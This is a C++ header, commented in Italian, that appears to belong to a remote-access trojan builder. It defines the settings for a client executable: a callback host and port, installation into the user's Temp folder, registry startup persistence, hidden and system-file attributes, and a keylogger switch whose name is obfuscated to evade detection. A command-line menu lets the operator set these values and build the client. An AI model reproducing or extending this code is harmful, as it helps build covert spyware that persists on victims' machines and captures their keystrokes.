#pragma once

// Classe per la gestione dei settaggi del Client
class SettaggiClient
{
private:
	DirUtils du;
	SettingsFile sf;

	void InitSettings()
	{
		if (!sf.CheckSetting("Host"))
			sf.SetSetting("Host", Host);

		if (!sf.CheckSetting("Port"))
			sf.SetSetting("Port", to_string(Porta));

		if (!sf.CheckSetting("InstallPath"))
			sf.SetSetting("InstallPath", InstallPath);

		if (!sf.CheckSetting("ExeName"))
			sf.SetSetting("ExeName", ExeName);

		if (!sf.CheckSetting("RegStartup"))
			sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");

		if (!sf.CheckSetting("HideExe"))
			sf.SetSetting("HideExe", (HideExe) ? "true" : "false");

		if (!sf.CheckSetting("SystemFile"))
			sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");

		if (!sf.CheckSetting((string)AY_OBFUSCATE("KeyLogger")))
			sf.SetSetting((string)AY_OBFUSCATE("KeyLogger"), (KeyLogger) ? "true" : "false");
	}

public:
	string Host = "127.0.0.1";
	int Porta = 6969;
	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
	string ExeName = "Client.exe";
	bool RegStartup = true;
	bool HideExe = true;
	bool SystemFile = false;
	bool KeyLogger = true;

	// Costruttore
	SettaggiClient()
	{
		sf.SetFileName(du.GetModuleFilePath() + "c-settings.ini");
		InitSettings();
	}

	// Popola i settaggi ottenendoli dal relativo file
	bool GetSettings()
	{
		if (!sf.CheckFile())
			return false;

		Host = sf.GetSetting("Host");
		Porta = stoi(sf.GetSetting("Port"));
		InstallPath = sf.GetSetting("InstallPath");
		ExeName = sf.GetSetting("ExeName");
		RegStartup = (sf.GetSetting("RegStartup") == "true");
		HideExe = (sf.GetSetting("HideExe") == "true");
		SystemFile = (sf.GetSetting("SystemFile") == "true");
		KeyLogger = (sf.GetSetting((string)AY_OBFUSCATE("KeyLogger")) == "true");

		return true;
	}

	// Restituisce i settaggi per il client in stringa
	string DumpSettingsForBuild()
	{
		string Dump = sf.Buff;

		Dump.erase(Dump.find("[HideExe]"), Dump.find("\\;", Dump.find("[HideExe]")) + 2 - Dump.find("[HideExe]"));
		Dump.erase(Dump.find("[SystemFile]"), Dump.find("\\;", Dump.find("[SystemFile]")) + 2 - Dump.find("[SystemFile]"));

		return Dump;
	}

	// Scrive i settaggi su file
	bool SetSettings()
	{
		if (!sf.CheckFile())
			return false;

		sf.SetSetting("Host", Host);
		sf.SetSetting("Port", to_string(Porta));
		sf.SetSetting("InstallPath", InstallPath);
		sf.SetSetting("ExeName", ExeName);
		sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");
		sf.SetSetting("HideExe", (HideExe) ? "true" : "false");
		sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");
		sf.SetSetting((string)AY_OBFUSCATE("KeyLogger"), (KeyLogger) ? "true" : "false");

		return true;
	}

	// Mostra in CLI i settaggi
	int ShowSettings()
	{
		CLInterface cli;
		VectSettings MenuImpostazioni;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[0].Name = "Esci";
		MenuImpostazioni[0].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[1].Name = "Host";
		MenuImpostazioni[1].Value = Host;
		MenuImpostazioni[1].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[2].Name = "Porta";
		MenuImpostazioni[2].Value = to_string(Porta);
		MenuImpostazioni[2].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[3].Name = "Percorso";
		MenuImpostazioni[3].Value = InstallPath;
		MenuImpostazioni[3].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[4].Name = "Nome File";
		MenuImpostazioni[4].Value = ExeName;
		MenuImpostazioni[4].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[5].Name = "Avvia con Windows";
		MenuImpostazioni[5].Value = (RegStartup) ? "true" : "false";
		MenuImpostazioni[5].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[6].Name = "File Nascosto";
		MenuImpostazioni[6].Value = (HideExe) ? "true" : "false";
		MenuImpostazioni[6].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[7].Name = "File di Sistema";
		MenuImpostazioni[7].Value = (SystemFile) ? "true" : "false";
		MenuImpostazioni[7].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[8].Name = "Crea Client";
		MenuImpostazioni[8].Escape = true;

		return cli.MenuSettings(MenuImpostazioni);
	}
};